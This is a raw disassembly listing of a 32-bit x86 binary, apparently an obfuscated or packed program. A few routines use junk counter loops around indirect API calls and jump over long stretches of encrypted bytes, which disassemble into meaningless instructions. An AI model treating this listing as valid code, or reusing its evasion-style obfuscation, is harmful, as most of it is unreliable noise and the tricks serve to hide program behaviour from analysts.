  404992:	sbb    ch,BYTE PTR [ebx+edx*8-0x6e]
  404996:	mov    edx,0x80f01378
  40499b:	in     al,dx
  40499c:	cdq    
  40499d:	xchg   ecx,eax
  40499e:	rcr    bl,cl
  4049a0:	sbb    ah,BYTE PTR [ecx]
  4049a2:	popa   
  4049a3:	cmp    eax,0x25810289
  4049a8:	pop    eax
  4049a9:	out    0x42,al
  4049ab:	add    BYTE PTR [eax],al
  4049ad:	add    BYTE PTR [eax],al
  4049af:	add    BYTE PTR [ebx],dh
  4049b1:	shl    BYTE PTR [ebx],cl
  4049b3:	adc    eax,0x42e658
  4049b8:	inc    edx
  4049b9:	mov    DWORD PTR ds:0x42e658,edx
  4049bf:	cmp    DWORD PTR ds:0x42e658,0xd
  4049c6:	jne    0x4049da
  4049cc:	push   0x1
  4049ce:	push   DWORD PTR [ebp-0x18]
  4049d1:	push   DWORD PTR [ebp-0xc]
  4049d4:	call   DWORD PTR ds:0x42e84f
  4049da:	cmp    DWORD PTR ds:0x42e658,0xc
  4049e1:	jne    0x4049f4
  4049e7:	mov    edx,DWORD PTR ds:0x42e658
  4049ed:	inc    edx
  4049ee:	mov    DWORD PTR ds:0x42e658,edx
  4049f4:	cmp    DWORD PTR ds:0x42e658,0x1c
  4049fb:	jb     0x4049b0
  404a01:	sub    DWORD PTR ds:0x42ec6b,ebx
  404a07:	mov    eax,DWORD PTR [ebp+0xc]
  404a0a:	xor    eax,ecx
  404a0c:	xor    DWORD PTR ds:0x43034f,ecx
  404a12:	push   esi
  404a13:	mov    esi,DWORD PTR [ebp+0x10]
  404a16:	add    DWORD PTR ds:0x42ec67,0x6bf6
  404a20:	mov    edx,0x32729b
  404a25:	sbb    DWORD PTR ds:0x430363,0x43035f
  404a2f:	add    eax,edx
  404a31:	add    DWORD PTR ds:0x42ec67,0x26eb
  404a3b:	mov    DWORD PTR [esi+0x4],eax
  404a3e:	adc    eax,DWORD PTR ds:0x43035b
  404a44:	mov    eax,DWORD PTR [ebp+0x14]
  404a47:	mov    esi,DWORD PTR [ebp+0x10]
  404a4a:	mov    DWORD PTR [esi+0x8],eax
  404a4d:	mov    eax,DWORD PTR [ebp+0x18]
  404a50:	mov    esi,DWORD PTR [ebp+0x10]
  404a53:	mov    DWORD PTR [esi+0xc],eax
  404a56:	mov    eax,DWORD PTR [ebp+0x1c]
  404a59:	mov    esi,DWORD PTR [ebp+0x10]
  404a5c:	mov    DWORD PTR [esi+0x10],eax
  404a5f:	mov    eax,eax
  404a61:	mov    eax,DWORD PTR [ebp+0x8]
  404a64:	xor    eax,ecx
  404a66:	add    eax,edx
  404a68:	pop    esi
  404a69:	leave  
  404a6a:	ret    0x18
  404a6d:	push   ebp
  404a6e:	mov    ebp,esp
  404a70:	mov    eax,DWORD PTR [ebp+0xc]
  404a73:	xor    edx,edx
  404a75:	mov    ecx,0x7264fca9
  404a7a:	jmp    0x404d36
  404a7f:	xor    dh,BYTE PTR ss:[edi]
  404a82:	loope  0x404ab7
  404a84:	loope  0x404a76
  404a86:	icebp  
  404a87:	pop    es
  404a88:	mov    DWORD PTR [ebp+0x79],ecx
  404a8b:	in     al,0xe0
  404a8d:	ret    
  404a8e:	mov    ch,0x47
  404a90:	and    eax,0x7c917e7e
  404a95:	jle    0x404b15
  404a97:	hlt    
  404a98:	cmp    cl,BYTE PTR [eax+0x5525569b]
  404a9e:	repnz adc ebx,DWORD PTR [ebx]
  404aa1:	or     eax,0x315d53ee
  404aa6:	xor    al,0x3
  404aa8:	sbb    ebx,DWORD PTR [ebp-0x40e4cb41]
  404aae:	xchg   esi,eax
  404aaf:	push   esp
  404ab0:	ret    0xf0ee
  404ab3:	mov    edi,0x6d6ed062
  404ab8:	lock mov BYTE PTR [edx-0x24682591],ah
  404abf:	dec    ecx
  404ac0:	pop    edi
  404ac1:	sub    BYTE PTR [edx+0x2],ch
  404ac4:	clc    
  404ac5:	out    dx,eax
  404ac6:	jb     0x404b35
  404ac8:	pop    es
  404ac9:	gs call 0x5474b198
  404acf:	addr16 or eax,0xed45383f
  404ad5:	fwait
  404ad6:	or     BYTE PTR [esi-0x16],al
  404ad9:	adc    eax,0xa83363c2
  404ade:	jae    0x404b27
  404ae0:	mov    ah,0xf9
  404ae2:	or     BYTE PTR [edi],dl
  404ae4:	(bad)
  404ae8:	mov    ebx,DWORD PTR [ebp-0x1b]
  404aeb:	dec    edx
  404aec:	dec    edx
  404aed:	(bad)  
  404af0:	shl    DWORD PTR [esi+0x5b6c7c1d],cl
  404af6:	and    bh,bl
  404af8:	cmp    DWORD PTR [ecx-0x1f],esp
  404afb:	mov    ah,0xc3
  404afd:	cs je  0x404a9a
  404b00:	aas    
  404b01:	mov    al,0xbe
  404b03:	lds    edx,FWORD PTR [edi-0x5dbff0bb]
  404b09:	iret   
  404b0a:	xchg   ch,ch
  404b0c:	ret    
  404b0d:	lock dec bx
  404b10:	fs in  al,0xcb
  404b13:	xchg   DWORD PTR [ecx-0x51],edx
  404b16:	dec    eax
  404b17:	pop    es
  404b18:	gs jmp 0x404b39
  404b1b:	and    eax,0xc89f1798
  404b20:	dec    edi
  404b21:	jnp    0x404b3a
  404b23:	ret    0x18a5
  404b26:	sbb    al,0x92
  404b28:	js     0x404afa
  404b2a:	push   esi
  404b2b:	inc    esi
  404b2c:	pop    eax
  404b2d:	bound  esp,QWORD PTR [esi+edi*2+0x6e]
  404b31:	ins    DWORD PTR es:[edi],dx
  404b32:	or     cl,cl
  404b34:	and    eax,0xee2dd449
  404b39:	xchg   edx,eax
  404b3a:	ss jbe 0x404ba0
  404b3d:	lods   al,BYTE PTR ds:[esi]
  404b3e:	cmp    BYTE PTR [ecx+0x56],ah
  404b41:	dec    edx
  404b42:	push   ebp
  404b43:	inc    ecx
  404b44:	(bad)  
  404b45:	jo     0x404afd
  404b47:	stc    
  404b48:	pop    eax
  404b49:	push   ecx
  404b4a:	adc    eax,DWORD PTR [esi]
  404b4c:	inc    ecx
  404b4d:	jno    0x404b49
  404b4f:	add    BYTE PTR [ecx-0x3e71c9f2],cl
  404b55:	sbb    DWORD PTR [esi+0x5d],eax
  404b58:	sbb    al,0x9f
  404b5a:	cmp    al,0xb4
  404b5c:	jae    0x404bbb
  404b5e:	jns    0x404bc5
  404b60:	mov    WORD PTR [edx],?
  404b62:	sub    DWORD PTR ds:0xbada03ea,esp
  404b68:	sahf   
  404b69:	icebp  
  404b6a:	ja     0x404b18
  404b6c:	dec    eax
  404b6d:	mov    esp,0x6af7f73f
  404b72:	mov    edi,DWORD PTR [eax]
  404b74:	mov    edi,0x1046aa7
  404b79:	pop    ecx
  404b7a:	pop    eax
  404b7b:	es clc 
  404b7d:	inc    ecx
  404b7e:	lahf   
  404b7f:	mov    edx,0xbe220054
  404b84:	jne    0x404b68
  404b86:	add    ebp,DWORD PTR [edx-0x16]
  404b89:	stos   DWORD PTR es:[edi],eax
  404b8a:	(bad)  
  404b8b:	or     al,0x48
  404b8d:	int3   
  404b8e:	hlt    
  404b8f:	inc    esi
  404b90:	pop    eax
  404b91:	sub    bh,ch
  404b93:	inc    ebx
  404b94:	inc    ebx
  404b95:	pushf  
  404b96:	aas    
  404b97:	ds jmp 0x8bc:0x6b9b
  404b9e:	xchg   ecx,eax
  404b9f:	jge    0x404b34
  404ba1:	in     al,dx
  404ba2:	stc    
  404ba3:	mov    ds:0xeb455d0,eax
  404ba8:	dec    bx
  404baa:	aam    0x4a
  404bac:	in     al,0xc9
  404bae:	ja     0x404b62
  404bb0:	mov    al,BYTE PTR [esp+eiz*4+0x9]
  404bb4:	jmp    0x404ba4
  404bb6:	jnp    0x404b7b
  404bb8:	pop    edx
  404bb9:	cs jecxz 0x404b83
  404bbc:	push   0xffffff90
  404bbe:	xchg   ebp,eax
  404bbf:	icebp  
  404bc0:	mov    ds:0xe9f8e837,eax
  404bc5:	pop    ds
  404bc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bc7:	div    al
  404bc9:	sub    DWORD PTR [ebp+0x72],0x4c4d5e80
  404bd0:	mov    cl,0xfb
  404bd2:	cli    
  404bd3:	inc    ecx
  404bd4:	jbe    0x404b7b
  404bd6:	mov    bl,BYTE PTR [edx-0x95d2a4a]
  404bdc:	punpckhwd mm7,QWORD PTR [esp+ebx*8]
  404be0:	push   0xfffffff8
  404be2:	xchg   ebp,eax
  404be3:	popf   
  404be4:	or     eax,0x5853a67c
  404be9:	jb     0x404bc7
  404beb:	das    
  404bec:	fwait
  404bed:	xor    DWORD PTR [edi-0x33],eax
  404bf0:	loope  0x404bb4
  404bf2:	popf   
  404bf3:	jecxz  0x404b86
  404bf5:	mov    ah,BYTE PTR [ebx+0x4b393548]
  404bfb:	jl     0x404bab
  404bfd:	sar    edi,1
  404bff:	jbe    0x404c6d
  404c01:	ins    BYTE PTR es:[edi],dx
  404c02:	nop
  404c03:	add    eax,0x5b3bb8e7
  404c08:	popa   
  404c09:	test   BYTE PTR [ecx-0x2c669ce3],al
  404c0f:	push   esi
  404c10:	jle    0x404be3
  404c12:	jbe    0x404bce
  404c14:	ss addr16 push ebx
  404c17:	adc    BYTE PTR ds:0x95fc8f51,bl
  404c1d:	cmp    edx,edi
  404c1f:	loop   0x404bc1
  404c21:	bound  edx,QWORD PTR [eax-0x18fe5d5d]
  404c27:	mov    dh,0x7c
  404c29:	aam    0x95
  404c2b:	pop    ss
  404c2c:	or     al,ah
  404c2e:	sti    
  404c2f:	addr16 inc esp
  404c31:	cmp    eax,0xf958eca0
  404c36:	mov    ch,0x77
  404c38:	sub    al,0xca
  404c3a:	ds sbb al,0x72
  404c3d:	or     eax,0x5df76e9a
  404c42:	aad    0xa0
  404c44:	push   edi
  404c45:	pop    ebp
  404c46:	adc    ch,BYTE PTR [edi]
  404c48:	dec    eax
  404c49:	xor    ebx,eax
  404c4b:	dec    esi
  404c4c:	or     DWORD PTR [ecx],0xfffffff1
  404c4f:	inc    ecx
  404c50:	inc    ecx
  404c51:	je     0x404c20
  404c53:	test   DWORD PTR [eax],ecx
  404c55:	sbb    DWORD PTR [ebx+0x7be57f23],edi
  404c5b:	call   0x4db5e3e8
  404c60:	mov    edi,0xab886f54
  404c65:	ja     0x404c75
  404c67:	adc    BYTE PTR [eax+0x4491c869],dh
  404c6d:	sbb    al,0x18
  404c6f:	xchg   esp,eax
  404c70:	add    ebp,DWORD PTR [ebx-0x16]
  404c73:	sub    al,0x8e
  404c75:	pop    ebp
  404c76:	fist   WORD PTR [ebx+0x2b]
  404c79:	dec    esi
  404c7a:	push   cs
  404c7b:	and    al,0xcb
  404c7d:	mov    esi,0x36719ada
  404c82:	cmp    al,0x7
  404c84:	sti    
  404c85:	jge    0x404c23
  404c87:	outs   dx,BYTE PTR ds:[esi]
  404c88:	dec    ebx
  404c89:	mov    al,0x77
  404c8b:	cdq    
  404c8c:	out    0x2c,al
  404c8e:	jnp    0x404ca8
  404c90:	dec    edi
  404c91:	rol    BYTE PTR [esi-0x664e1ca3],cl
  404c97:	es mov ah,0x20
  404c9a:	ret    0xcfb3
  404c9d:	mov    cl,BYTE PTR [ecx-0x75]
  404ca0:	(bad)  
  404ca1:	sbb    bh,ch
  404ca3:	dec    esi
  404ca4:	fs hlt 
  404ca6:	xchg   edi,eax
  404ca7:	adc    edi,eax
  404ca9:	ds mov bh,0xd5
  404cac:	sbb    edi,eax
  404cae:	push   esi
  404caf:	push   ecx
  404cb0:	mov    dh,0x92
  404cb2:	cmp    al,0x83
  404cb4:	ds out 0x8e,eax
  404cb7:	jle    0x404d06
  404cb9:	inc    ecx
  404cba:	data16 sbb BYTE PTR [eax-0x39a6dcdd],bh
  404cc1:	scas   al,BYTE PTR es:[edi]
  404cc2:	dec    ecx
  404cc3:	clc    
  404cc4:	or     eax,0xd3b75348
  404cc9:	xchg   edi,eax
  404cca:	sub    BYTE PTR [edi],dl
  404ccc:	dec    ebp
  404ccd:	dec    ecx
  404cce:	shl    DWORD PTR [ecx-0x49],0xc8
  404cd2:	pop    edx
  404cd3:	mov    ecx,0x3aa3f439
  404cd8:	icebp  
  404cd9:	fbld   TBYTE PTR [ecx+0x7e]
  404cdc:	pushf  
  404cdd:	(bad)  
  404cde:	std    
  404cdf:	(bad)  
  404ce0:	cmp    esi,esp
  404ce2:	and    eax,0xa9adcaa6
  404ce7:	mov    ah,0x30
  404ce9:	mov    ds:0x844f66f0,al
  404cee:	ds adc al,ah
  404cf1:	pop    es
  404cf2:	loop   0x404d5e
  404cf4:	fmul   st(2),st
  404cf6:	xchg   esp,eax
  404cf7:	dec    edx
  404cf8:	jb     0x404cf3
  404cfa:	mov    eax,0x2624a1a0
  404cff:	xor    BYTE PTR [edx+0x5defa156],0x2a
  404d06:	pop    eax
  404d07:	cwde   
  404d08:	push   ds
  404d09:	dec    edi
  404d0a:	adc    DWORD PTR [eax+eax*4-0x1b],edx
  404d0e:	adc    ecx,0xffffffbf
  404d11:	add    al,0x9c
  404d13:	and    DWORD PTR [ecx-0x5ece5580],ecx
  404d19:	repz loopne 0x404d70
  404d1c:	xor    al,0xfd
  404d1e:	cwde   
  404d1f:	push   0x782105d5
  404d24:	inc    ebp
  404d25:	dec    eax
  404d26:	mov    BYTE PTR [ebp+0x63],dl
  404d29:	shl    BYTE PTR [esp+ebp*4-0x4a5550b6],cl
  404d30:	dec    ebp
  404d31:	(bad)  
  404d32:	js     0x404d54
  404d34:	aam    0x59
  404d36:	div    ecx
  404d38:	mov    ecx,DWORD PTR [ebp+0x10]
  404d3b:	and    ecx,eax
  404d3d:	or     ecx,0x81161d8f
  404d43:	mov    eax,ecx
  404d45:	pop    ebp
  404d46:	ret    0x18
  404d49:	push   ebp
  404d4a:	mov    ebp,esp
  404d4c:	jmp    0x404f59
  404d51:	pop    ds
  404d52:	iret   
  404d53:	xchg   edi,eax
  404d54:	cmp    DWORD PTR [edi+0x41],esi
  404d57:	jno    0x404d42
  404d59:	das    
  404d5a:	ins    BYTE PTR es:[edi],dx
  404d5b:	xchg   esp,eax
  404d5c:	mov    eax,0xdfe5425b
  404d61:	out    0x20,al
  404d63:	jle    0x404de3
  404d65:	outs   dx,BYTE PTR ds:[esi]
  404d66:	jg     0x404de6
  404d68:	jle    0x404db4
  404d6a:	mov    BYTE PTR ds:0xd4e6441a,dh
  404d70:	sub    DWORD PTR [ecx+0x7dd6ad30],eax
  404d76:	rcl    BYTE PTR [ebp+0x1e7d515c],0x34
  404d7d:	lahf   
  404d7e:	jle    0x404dda
  404d80:	xchg   esp,eax
  404d81:	fld    QWORD PTR [edi-0x5c120fc3]
  404d87:	cs dec esi
  404d89:	mov    eax,ds:0xcd4292d5
  404d8e:	pop    esi
  404d8f:	dec    ebp
  404d90:	lods   eax,DWORD PTR ds:[esi]
  404d91:	leave  
  404d92:	fcomp  DWORD PTR [edx+0x1a]
  404d95:	push   ds
  404d96:	add    al,0xd8
  404d98:	pop    ss
  404d99:	(bad)  
  404d9a:	sti    
  404d9b:	mov    ch,dh
  404d9d:	pop    ecx
  404d9e:	sbb    eax,0x71c63784
  404da3:	scas   eax,DWORD PTR es:[edi]
  404da4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404da5:	mov    ds:0x5b2d2f5a,al
  404daa:	pop    ds
  404dab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404dac:	cdq    
  404dad:	push   0x2e5f978e
  404db2:	mov    ecx,0x53495143
  404db7:	aas    
  404db8:	add    esi,ebp
  404dba:	and    ch,BYTE PTR [edx+0x2529ccea]
  404dc0:	ret    0x38e2
  404dc3:	clc    
  404dc4:	jns    0x404d7e
  404dc6:	sbb    eax,0xb4f5836c
  404dcb:	jle    0x404de5
  404dcd:	(bad)  
  404dce:	jnp    0x404e10
  404dd0:	sbb    DWORD PTR [edi],edx
  404dd2:	mov    BYTE PTR ds:0x4b7accef,ah
  404dd8:	ja     0x404df9
  404dda:	mov    ebp,0xfa92a094
  404ddf:	ret    0x27f9
  404de2:	cmp    bl,BYTE PTR [ebp-0x4f]
  404de5:	sub    al,0x42
  404de7:	jmp    0xec1f:0x8f206ebb
  404dee:	repnz lods al,BYTE PTR ds:[esi]
  404df0:	xchg   BYTE PTR [edx],ah
  404df2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404df3:	dec    ecx
  404df4:	loopne 0x404dc1
  404df6:	ja     0x404da6
  404df8:	or     al,0xf0
  404dfa:	sub    esi,DWORD PTR [edi+0x65]
  404dfd:	add    cl,BYTE PTR [ebx+0x57c30015]
  404e03:	ja     0x404e7a
  404e05:	xor    DWORD PTR [edx],0xfffffff9
  404e08:	ret    
  404e09:	in     eax,dx
  404e0a:	fsubr  QWORD PTR [ecx-0x19]
  404e0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e0e:	push   ds
  404e0f:	sysenter 
  404e11:	loop   0x404e54
  404e13:	outs   dx,BYTE PTR ds:[esi]
  404e14:	adc    BYTE PTR [ebx-0x7e],dl
  404e17:	xchg   edi,eax
  404e18:	xor    ch,BYTE PTR [edi-0x26]
  404e1b:	dec    BYTE PTR [esi-0x48]
  404e1e:	xor    DWORD PTR [eax+0x16],esi
  404e21:	adc    cl,BYTE PTR [edx-0x4973a6e0]
  404e27:	imul   edx,DWORD PTR [ecx+0x29b05d4e],0xfffffff6
  404e2e:	dec    ebx
  404e2f:	arpl   WORD PTR [ebx],si
  404e31:	cmp    al,0xa2
  404e33:	ds cmp ebx,ebp
  404e36:	sar    eax,cl
  404e38:	sbb    DWORD PTR [ebp-0x7d],esp
  404e3b:	inc    ebx
  404e3c:	jns    0x404de2
  404e3e:	cmp    edi,0x25
  404e41:	and    al,0x6b
  404e43:	les    eax,FWORD PTR ss:[esi-0x40634135]
  404e4a:	fwait
  404e4b:	(bad)  
  404e4c:	loop   0x404e60
  404e4e:	in     eax,dx
  404e4f:	outs   dx,BYTE PTR ds:[esi]
  404e50:	sub    esp,esp
  404e52:	fxam   
  404e54:	sbb    BYTE PTR [edi],bh
  404e56:	mov    cs:0x1ac18703,eax
  404e5c:	xchg   edx,eax
  404e5d:	jb     0x404ece
  404e5f:	dec    esp
  404e60:	inc    edi
  404e61:	sub    al,0xe1
  404e63:	(bad)  
  404e64:	in     eax,0x4f
  404e66:	adc    esi,edx
  404e68:	gs pop ebp
  404e6a:	cmp    BYTE PTR [ecx+0x74],bl
  404e6d:	fs xchg esi,eax
  404e6f:	stos   BYTE PTR es:[edi],al
  404e70:	repnz push ss
  404e72:	rep outs dx,DWORD PTR ds:[esi]
  404e74:	daa    
  404e75:	jns    0x404ed9
  404e77:	in     eax,dx
  404e78:	inc    eax
  404e79:	mov    cl,0x72
  404e7b:	cwde   
  404e7c:	ins    BYTE PTR es:[edi],dx
  404e7d:	jno    0x404ed9
  404e7f:	sbb    DWORD PTR [ebx-0x785e1abc],edx
  404e85:	gs sub eax,0xce6dad95
  404e8b:	fsubr  QWORD PTR [ebx+eax*2+0x1f]
  404e8f:	cmp    ebx,DWORD PTR [esi-0x43c6a314]
  404e95:	mov    dl,0xd8
  404e97:	(bad)  
  404e98:	das    
  404e99:	pusha  
  404e9a:	mov    ebx,0xb24c2923
  404e9f:	push   ds
  404ea0:	adc    BYTE PTR [ebx],0x86
  404ea3:	in     al,dx
  404ea4:	outs   dx,DWORD PTR ds:[esi]
  404ea5:	int3   
  404ea6:	test   al,0x3a
  404ea8:	in     al,0x47
  404eaa:	xlat   BYTE PTR ds:[ebx]
  404eab:	push   edx
  404eac:	fcmovnu st,st(5)
  404eae:	mov    ebp,0xc9bf84d1
  404eb3:	hlt    
  404eb4:	aaa    
  404eb5:	pop    esi
  404eb6:	pusha  
  404eb7:	fidivr WORD PTR [edx+0x5e133ae3]
  404ebd:	fst    QWORD PTR [eax-0x7e0f4c0b]
  404ec3:	sbb    cl,BYTE PTR [edx]
  404ec5:	pop    eax
  404ec6:	aad    0xae
  404ec8:	je     0x404ee8
  404eca:	xor    DWORD PTR [esi],ebx
  404ecc:	ficom  WORD PTR [ecx-0x1d]
  404ecf:	push   edx
  404ed0:	sbb    eax,0xca774a8e
  404ed5:	imul   BYTE PTR [esi]
  404ed7:	ret    
  404ed8:	lods   al,BYTE PTR ds:[esi]
  404ed9:	cmp    al,0x7a
  404edb:	imul   edx,DWORD PTR [ecx-0x5400e68b],0x1a2e2108
  404ee5:	push   ebp
  404ee6:	inc    edx
  404ee7:	push   es
  404ee8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ee9:	jmp    0xd74e:0x7293c101
  404ef0:	fidiv  WORD PTR [ebx+0x7a]
  404ef3:	dec    esi
  404ef4:	inc    ebp
  404ef5:	rol    BYTE PTR [esi],0x18
  404ef8:	pop    edx
  404ef9:	push   eax
  404efa:	sbb    eax,0xd1c4eb7d
  404eff:	fisub  WORD PTR [edx]
  404f01:	push   ecx
  404f02:	adc    BYTE PTR [edi-0x37],ch
  404f05:	add    eax,0x772e2ce4
  404f0a:	jo     0x404f38
  404f0c:	imul   eax,DWORD PTR ds:0xf88c15ef,0x2ea69e0e
  404f16:	lds    esp,FWORD PTR [edi+0x49]
  404f19:	jecxz  0x404eea
  404f1b:	xor    edi,DWORD PTR [edi+eiz*8-0x26b2cbbe]
  404f22:	jg     0x404ed0
  404f24:	retf   0xf0de
  404f27:	lock lods eax,DWORD PTR ds:[esi]
  404f29:	jnp    0x404f62
  404f2b:	stos   DWORD PTR es:[edi],eax
  404f2c:	outs   dx,BYTE PTR ds:[esi]
  404f2d:	and    al,0xde
  404f2f:	jmp    DWORD PTR [eax-0x69]
  404f32:	fs test dl,ah
  404f35:	mov    edi,0xa91e2b4f
  404f3a:	call   FWORD PTR cs:[ecx+ebp*2]
  404f3e:	fisub  DWORD PTR [esi+0x5456bd63]
  404f44:	jp     0x404f26
  404f46:	mov    al,ds:0x8136a1b1
  404f4b:	xchg   edx,eax
  404f4c:	add    al,0x37
  404f4e:	adc    eax,0x56776fd5
  404f53:	in     eax,0x3c
  404f55:	push   0xffffffcb
  404f57:	repnz scas al,BYTE PTR es:[edi]
  404f59:	push   ecx
  404f5a:	and    DWORD PTR ds:0x4302d9,0x0
  404f64:	jmp    0x404f74
  404f69:	mov    eax,ds:0x4302d9
  404f6e:	inc    eax
  404f6f:	mov    ds:0x4302d9,eax
  404f74:	cmp    DWORD PTR ds:0x4302d9,0x15
  404f7b:	jae    0x404fbb
  404f81:	cmp    DWORD PTR ds:0x4302d9,0x17
  404f88:	jne    0x404fa4
  404f8e:	push   0x42e654
  404f93:	push   DWORD PTR [ebp-0x10]
  404f96:	push   0x32cc
  404f9b:	push   DWORD PTR [ebp-0x24]
  404f9e:	call   DWORD PTR ds:0x42e91f
  404fa4:	jmp    0x404f69
  404fa9:	mov    edx,DWORD PTR ds:0x42ec57
  404faf:	xor    edx,DWORD PTR ds:0x4302d1
  404fb5:	mov    DWORD PTR ds:0x42ec57,edx
  404fbb:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  404fc2:	mov    edx,DWORD PTR ds:0x42ece9
  404fc8:	mov    eax,ds:0x42e803
  404fcd:	sub    eax,edx
  404fcf:	and    edx,DWORD PTR [edx+eax*1]
  404fd2:	mov    eax,DWORD PTR [ebp-0x4]
  404fd5:	movzx  ecx,WORD PTR ds:0x42e658
  404fdc:	sub    ecx,DWORD PTR ds:0x4302cd
  404fe2:	mov    DWORD PTR ds:0x42e658,ecx
  404fe8:	mov    edx,DWORD PTR [ebp+0x10]
  404feb:	and    DWORD PTR ds:0x42ec73,0x0
  404ff5:	mov    ecx,DWORD PTR ds:0x42ec73
  404ffb:	inc    ecx
  404ffc:	mov    DWORD PTR ds:0x42ec73,ecx
  405002:	cmp    DWORD PTR ds:0x42ec73,0x7
  405009:	jne    0x405018
  40500f:	push   DWORD PTR [ebp-0x28]
  405012:	call   DWORD PTR ds:0x42e853
  405018:	cmp    DWORD PTR ds:0x42ec73,0x6
  40501f:	jne    0x405034
  405025:	xor    ecx,ecx
  405027:	or     ecx,DWORD PTR ds:0x42ec73
  40502d:	inc    ecx
  40502e:	mov    DWORD PTR ds:0x42ec73,ecx
  405034:	cmp    DWORD PTR ds:0x42ec73,0x1e
  40503b:	jb     0x404ff5
  405041:	jmp    0x40524e
  405046:	inc    eax
  405047:	jo     0x405063
  405049:	xor    BYTE PTR [edx],ch
  40504b:	jo     0x40509d
  40504d:	jo     0x40502d
  40504f:	shl    BYTE PTR [eax],1
  405051:	outs   dx,BYTE PTR ds:[esi]
  405052:	cmc    
  405053:	test   eax,0x2ed65688
  405058:	jle    0x4050d8
  40505a:	outs   dx,BYTE PTR ds:[esi]
  40505b:	jg     0x4050db
  40505d:	jle    0x4050aa
  40505f:	nop
  405060:	xor    eax,DWORD PTR [eax+0x17]
  405063:	out    0x69,al
  405065:	(bad)  
  405066:	imul   eax,eax,0xfffffff3
  405069:	call   0xaadf9ff2
  40506e:	xchg   ecx,eax
  40506f:	mov    WORD PTR [ebx],gs
  405071:	pop    ebx
  405072:	call   0xeee1:0xa1dc81fa
  405079:	in     al,dx
  40507a:	lea    esi,[eax+0x5e052e9b]
  405080:	xchg   ecx,eax
  405081:	push   ebp
  405082:	cmp    eax,0x4430fc5d
  405087:	xor    cl,BYTE PTR [ebx]
  405089:	and    eax,0x65f6ecbf
  40508e:	into   
  40508f:	xlat   BYTE PTR ds:[ebx]
  405090:	jmp    0x2353fac
  405095:	lock (bad) 
  405097:	dec    eax
  405098:	cs dec eax
  40509a:	sub    bl,bh
  40509c:	neg    DWORD PTR [ebx+0xb]
  40509f:	gs aad 0x8e
  4050a2:	push   esi
  4050a3:	nop
  4050a4:	cmc    
  4050a5:	pop    edx
  4050a6:	sbb    al,0x7a
  4050a8:	pop    ebp
  4050a9:	stos   BYTE PTR es:[edi],al
  4050aa:	xor    BYTE PTR [eax],dh
  4050ac:	jge    0x405036
  4050ae:	add    ah,BYTE PTR [eax+eax*1+0x166ff98c]
  4050b5:	aas    
  4050b6:	add    dl,0x9d
  4050b9:	ficomp WORD PTR [eax]
  4050bb:	retf   0x77af
  4050be:	push   ebx
  4050bf:	(bad)  
  4050c0:	fs retf 
  4050c2:	push   ds
  4050c3:	arpl   WORD PTR [eax],dx
  4050c5:	pop    edi
  4050c6:	es jb  0x40505b
  4050c9:	ss jns 0x405094
  4050cc:	repz cmovle esp,DWORD PTR [eax]
  4050d0:	dec    ecx
  4050d1:	xchg   edx,eax
  4050d2:	lea    edi,[edi]
  4050d4:	shl    edi,0x59
  4050d7:	push   esi
  4050d8:	rcr    DWORD PTR [ebx+0x5a],0x74
  4050dc:	sti    
  4050dd:	pusha  
  4050de:	fisttp DWORD PTR [ecx+eiz*4-0x1f4f598c]
  4050e5:	fidivr WORD PTR [ebx]
  4050e7:	sbb    eax,0x75b04272
  4050ec:	add    al,0xca
  4050ee:	or     al,0x12
  4050f0:	daa    
  4050f1:	mov    edi,DWORD PTR [ecx-0x54413269]
  4050f7:	neg    DWORD PTR [ecx-0x445becae]
  4050fd:	xor    ecx,DWORD PTR ds:0xc53c0e75
  405103:	mov    dl,0xf0
  405105:	stos   DWORD PTR es:[edi],eax
  405106:	dec    esi
  405107:	bound  eax,QWORD PTR [ebp+0x49]
  40510a:	push   ecx
  40510b:	int3   
  40510c:	cmc    
  40510d:	mov    ebp,0xe9977d96
  405112:	mov    ds:0x2a588ebb,al
  405117:	sbb    al,0xa8
  405119:	sub    al,0x9f
  40511b:	lea    esp,[edx+0x7b]
  40511e:	(bad)  
  40511f:	ss in  eax,dx
  405121:	into   
  405122:	sbb    WORD PTR [eax+eiz*4],di
  405126:	data16 jecxz 0x4050ee
  405129:	(bad)
  40512d:	or     esp,ecx
  40512f:	(bad)  
  405130:	pop    edi
  405131:	leave  
  405132:	icebp  
  405133:	jns    0x40514b
  405135:	imul   esi,DWORD PTR [ecx-0xe4f97ff],0xf2791dff
  40513f:	add    al,0xd2
  405141:	inc    esp
  405142:	sbb    edx,DWORD PTR [ebp-0x74]
  405145:	(bad)  
  405146:	int    0x15
  405148:	and    eax,0x15f854cc
  40514d:	das    
  40514e:	and    BYTE PTR [eax+0x190766ec],dh
  405154:	add    eax,0xe8ba35b8
  405159:	pop    ds
  40515a:	sub    al,BYTE PTR [ecx+0x1efd513f]
  405160:	out    0xc8,eax
  405162:	lock lahf 
  405164:	mov    ch,0x35
  405166:	cmp    ah,BYTE PTR [esi-0xc]
  405169:	(bad)  
  40516a:	outs   dx,DWORD PTR ds:[esi]
  40516b:	jno    0x4051df
  40516d:	div    DWORD PTR [ebx]
  40516f:	dec    esi
  405170:	and    al,0x6b
  405172:	and    BYTE PTR [esi+0x395959b1],0xa4
  405179:	push   esp
  40517a:	or     esp,0x6ae2a40d
  405180:	shl    BYTE PTR ds:0xc4f621d1,1
  405186:	les    edi,FWORD PTR ss:[esi-0x23c6dc8b]
  40518d:	add    edi,ecx
  40518f:	mov    al,0x36
  405191:	sbb    BYTE PTR [edx+0x7dcf19fe],ah
  405197:	out    dx,eax
  405198:	mov    WORD PTR [edx-0x153cc616],gs
  40519e:	ffreep st(6)
  4051a0:	add    al,0x87
  4051a2:	adc    ch,BYTE PTR [ebx+ebx*1+0x50a355a9]
  4051a9:	inc    ebp
  4051aa:	(bad)
  4051ae:	lds    ecx,FWORD PTR [ecx+0x21178413]
  4051b4:	pop    ebx
  4051b5:	int    0xe1
  4051b7:	or     BYTE PTR [ecx],al
  4051b9:	sub    al,0xe
  4051bb:	pop    es
  4051bc:	or     DWORD PTR [esi+0x75],ecx
  4051bf:	loop   0x4051af
  4051c1:	pop    ebx
  4051c2:	lods   eax,DWORD PTR ds:[esi]
  4051c3:	xor    al,0x0
  4051c5:	addr16 sbb eax,0xba4f0370
